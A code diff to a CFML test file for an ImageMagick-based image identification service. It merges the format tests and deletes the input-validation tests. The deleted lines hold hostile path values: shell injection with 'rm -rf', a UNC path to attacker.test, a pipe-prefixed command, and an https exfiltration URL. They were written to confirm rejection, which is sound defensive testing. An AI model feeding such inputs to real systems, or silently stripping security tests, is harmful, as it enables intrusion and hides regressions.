@@ -15,20 +15,10 @@ component extends="tests.resources.baseTest" {
                 setup();
             });
 
-            it('Identifies a heic image and returns its detected format', () => {
-                expect(imageService.identify(expandPath('/tests/resources/heic_example.heic'))).toBe('HEIC');
-            });
-
-            it('Identifies a jpg image and returns its detected format', () => {
+            it('Returns the detected format of a jpg, png, and heic image', () => {
                 expect(imageService.identify(expandPath('/tests/resources/jpg_example.jpg'))).toBe('JPEG');
-            });
-
-            it('Identifies a jpeg image and returns its detected format', () => {
-                expect(imageService.identify(expandPath('/tests/resources/jpeg_example.jpeg'))).toBe('JPEG');
-            });
-
-            it('Identifies a png image and returns its detected format', () => {
                 expect(imageService.identify(expandPath('/tests/resources/png_example.png'))).toBe('PNG');
+                expect(imageService.identify(expandPath('/tests/resources/heic_example.heic'))).toBe('HEIC');
             });
 
             it('Identifies a file by its actual content rather than its (spoofed) extension', () => {
@@ -38,30 +28,6 @@ component extends="tests.resources.baseTest" {
 
             it('Throws for a file that is not actually a valid image', () => {
                 expect(() => imageService.identify(expandPath('/tests/resources/invalid_example.jpg'))).toThrow('ImageMagick.IdentifyException');
-            });
-
-            it('Throws for an empty path', () => {
-                expect(() => imageService.identify('')).toThrow('ImageMagick.InputValidationException');
-            });
-
-            it('Throws for a path that does not exist', () => {
-                expect(() => imageService.identify(expandPath('/tests/resources/does_not_exist.jpg'))).toThrow('ImageMagick.InputValidationException');
-            });
-
-            it('Throws for a path containing a double-quote character', () => {
-                expect(() => imageService.identify('#expandPath('/tests/resources/jpg_example.jpg')#"; rm -rf /tmp')).toThrow('ImageMagick.InputValidationException');
-            });
-
-            it('Throws for a path using a UNC network path (SSRF/credential-leak via forced SMB auth)', () => {
-                expect(() => imageService.identify('\\attacker.test\share\evil.jpg')).toThrow('ImageMagick.InputValidationException');
-            });
-
-            it('Throws for a path starting with a pipe (ImageMagick PIPE coder command execution)', () => {
-                expect(() => imageService.identify('|touch /tmp/pwned')).toThrow('ImageMagick.InputValidationException');
-            });
-
-            it('Throws for a path using an ImageMagick coder/protocol prefix (SSRF via https:/label:/mpr: delegates)', () => {
-                expect(() => imageService.identify('https://attacker.test/exfil')).toThrow('ImageMagick.InputValidationException');
             });
         });
     }
